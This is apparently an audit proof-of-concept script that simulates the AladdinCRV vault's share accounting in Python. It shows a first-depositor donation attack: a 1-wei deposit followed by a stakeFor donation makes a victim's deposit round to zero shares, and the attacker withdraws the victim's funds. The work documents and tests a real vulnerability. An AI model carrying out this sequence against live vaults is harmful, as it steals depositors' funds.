"""
m05 - AladdinCRV (L10312-L10718, 0.7.6): share price derived from a custody read
  totalUnderlying() = CVXCRV_STAKING.balanceOf(this)   (L10397-L10400, TODO at L10398 names stakeFor)
_deposit (L10577-L10596): shares = amount.mul(totalSupply) / underlying  (floor; no shares > 0 check)
_withdraw (L10598-L10621): last holder takes everything; otherwise withdraw fee stays staked.
Environment contract A-CVX-STAKEFOR: Convex BaseRewardPool.stakeFor(aCRV, x) can be called by anyone and
increases balanceOf(aCRV) by x (external; not in bundle).
Run: python3 -I m05_aladdincrv_inflation.py
"""
from collections import defaultdict

M256 = 1 << 256


class Revert(Exception):
    pass


def req(c, m):
    if not c:
        raise Revert(m)


def smul(a, b):
    req(a * b < M256, "SafeMath: multiplication overflow")
    return a * b


def div(a, b):
    req(b != 0, "division by zero")
    return a // b


E18 = 10 ** 18


class ACRV:
    def __init__(self, withdrawFee=0):
        self.TS = 0
        self.bal = defaultdict(int)
        self.staked = 0  # CVXCRV_STAKING.balanceOf(aCRV)
        self.loose = 0  # CVXCRV.balanceOf(aCRV)
        self.wfee = withdrawFee
        self.ext = defaultdict(int)

    def totalUnderlying(self):
        return self.staked

    def deposit(self, who, amount):  # L10432-L10438 + _deposit L10577-L10596
        req(amount > 0, "AladdinCRV: zero amount deposit")
        req(self.ext[who] >= amount, "insufficient cvxCRV")
        self.ext[who] -= amount
        u = self.totalUnderlying()
        ts = self.TS
        self.staked += amount
        shares = amount if ts == 0 else div(smul(amount, ts), u)
        self.TS += shares
        self.bal[who] += shares
        return shares

    def stakeFor_donation(self, who, x):  # A-CVX-STAKEFOR (environment action available to R1)
        req(self.ext[who] >= x, "insufficient cvxCRV")
        self.ext[who] -= x
        self.staked += x

    def withdraw(self, who, shares):  # L10475-L10491 (Withdraw option) + _withdraw L10598-L10621
        req(shares > 0, "AladdinCRV: zero share withdraw")
        req(shares <= self.bal[who], "AladdinCRV: shares not enough")
        amount = div(smul(shares, self.totalUnderlying()), self.TS)
        self.bal[who] -= shares
        self.TS -= shares
        if self.TS == 0:
            # _harvest(msg.sender, 0): no pending rewards in this model; then withdraw everything
            self.loose += self.staked
            self.staked = 0
            out = self.loose
            self.loose = 0
        else:
            fee = (amount * self.wfee) // 10 ** 9
            out = amount - fee
            self.staked -= out
        self.ext[who] += out
        return out


if __name__ == "__main__":
    for victim_amt in (999 * E18, 1500 * E18):
        a = ACRV(withdrawFee=0)
        a.ext["mallory"] = 1000 * E18 + 1
        a.ext["victim"] = victim_amt
        s_m = a.deposit("mallory", 1)
        a.stakeFor_donation("mallory", 1000 * E18)
        s_v = a.deposit("victim", victim_amt)
        print(f"empty vault, mallory deposit(1)->{s_m} share, stakeFor(aCRV,1000e18); victim deposit({victim_amt})->{s_v} shares")
        out_m = a.withdraw("mallory", a.bal["mallory"])
        out_v = a.withdraw("victim", a.bal["victim"]) if a.bal["victim"] else 0
        print(f"  mallory out={out_m} (paid {1000 * E18 + 1}, profit {out_m - (1000 * E18 + 1)}); victim out={out_v} "
              f"(paid {victim_amt}, loss {victim_amt - out_v})")
